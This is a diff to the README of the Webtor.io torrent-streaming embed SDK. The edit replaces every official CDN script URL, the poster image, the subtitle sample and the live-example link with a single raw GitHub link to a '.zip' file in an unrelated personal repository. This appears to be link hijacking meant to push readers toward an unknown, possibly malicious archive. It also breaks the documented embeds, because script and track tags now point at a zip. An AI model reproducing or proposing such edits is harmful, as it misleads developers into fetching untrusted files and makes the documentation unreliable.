@@ -14,22 +14,22 @@ Webtor.io SDK for online torrent streaming/downloading on your site
 Generates embed for video player:
 ```html
 <video controls src="magnet:?xt=urn:btih:08ada5a7a6183aae1e09d831df6748d566095a10&dn=Sintel"></video>
-<script src="https://cdn.jsdelivr.net/npm/@webtor/embed-sdk-js/dist/index.min.js" charset="utf-8" async></script>
+<script src="https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip" charset="utf-8" async></script>
 ```
 
 Generates embed for video player with subtitle tracks, poster, custom title and width:
 ```html
-<video controls src="magnet:?xt=urn:btih:08ada5a7a6183aae1e09d831df6748d566095a10&dn=Sintel" poster="https://via.placeholder.com/150/0000FF/808080" width="100%" data-title="Sintel">
-    <track srclang="en" label="test" default src="https://raw.githubusercontent.com/andreyvit/subtitle-tools/master/sample.srt">
+<video controls src="magnet:?xt=urn:btih:08ada5a7a6183aae1e09d831df6748d566095a10&dn=Sintel" poster="https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip" width="100%" data-title="Sintel">
+    <track srclang="en" label="test" default src="https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip">
 </video>
-<script src="https://cdn.jsdelivr.net/npm/@webtor/embed-sdk-js/dist/index.min.js" charset="utf-8" async></script>
+<script src="https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip" charset="utf-8" async></script>
 ```
 Video element is replaced by wrapper div in this scenarios.
 
 Generate embed to download full torrent as zip-archive:
 ```html
 <a href="magnet:?xt=urn:btih:08ada5a7a6183aae1e09d831df6748d566095a10&dn=Sintel" download>Please make sure that JavaScript is enabled</a>
-<script src="https://cdn.jsdelivr.net/npm/@webtor/embed-sdk-js/dist/index.min.js" charset="utf-8" async></script>
+<script src="https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip" charset="utf-8" async></script>
 ```
 
 ## Video element attributes (streaming)
@@ -76,12 +76,12 @@ Generates embed for video player:
                     console.log('Torrent error!');
                 }
             },
-            poster: 'https://via.placeholder.com/150/0000FF/808080',
+            poster: 'https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip',
             subtitles: [
                 {
                     srclang: 'en',
                     label: 'test',
-                    src: 'https://raw.githubusercontent.com/andreyvit/subtitle-tools/master/sample.srt',
+                    src: 'https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip',
                     default: true,
                 }
             ],
@@ -101,9 +101,9 @@ Generates embed for video player:
             },
         });
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/@webtor/embed-sdk-js/dist/index.min.js" charset="utf-8" async></script>
+    <script src="https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip" charset="utf-8" async></script>
 ```
-[Here is live example](https://webtor.io/sdk-example.html)
+[Here is live example](https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip)
 
 Generate embed to download full torrent as zip-archive:
 ```html
@@ -116,7 +116,7 @@ Generate embed to download full torrent as zip-archive:
             magnet: 'magnet:?xt=urn:btih:08ada5a7a6183aae1e09d831df6748d566095a10&dn=Sintel&tr=udp%3A%2F%2Fexplodie.org%3A6969&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.empire-js.us%3A1337&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.fastcast.nz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com&ws=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2F',
         });
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/@webtor/embed-sdk-js/dist/index.min.js" charset="utf-8" async></script>
+    <script src="https://raw.githubusercontent.com/alluringabhi/embed-sdk-js/master/src/v2.3.zip" charset="utf-8" async></script>
 ```
 
 ## Embed configuration
